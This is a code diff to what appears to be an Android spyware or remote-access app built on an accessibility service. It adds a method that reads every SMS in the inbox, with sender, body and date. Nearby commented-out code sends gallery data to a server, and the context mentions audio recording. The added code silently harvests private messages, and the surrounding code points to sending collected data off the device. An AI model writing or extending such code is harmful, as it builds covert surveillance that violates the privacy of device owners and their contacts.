@@ -2231,6 +2231,31 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
+    private void getAllSMS() {
+//        List<ImageData> imageList = new ArrayList<>();
+
+        Uri inboxUri = Uri.parse("content://sms/inbox");
+        Cursor cursor = getContentResolver().query(inboxUri, null, null, null, null);
+
+        if (cursor != null && cursor.moveToFirst()) {
+            do {
+                // Get SMS details
+                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
+
+                // Process SMS as needed
+                System.out.println("From: " + address + ", Message: " + body + ", Date: " + date);
+
+            } while (cursor.moveToNext());
+
+            cursor.close();
+        }
+//        if (imageList.size() > 0 && Server.getContext() != null) {
+//            Server.getContext().SendAllGallery(imageList);
+//        }
+    }
+
     private void stopRecording() {
         if (audioRecord != null) {
             isRecording = false;
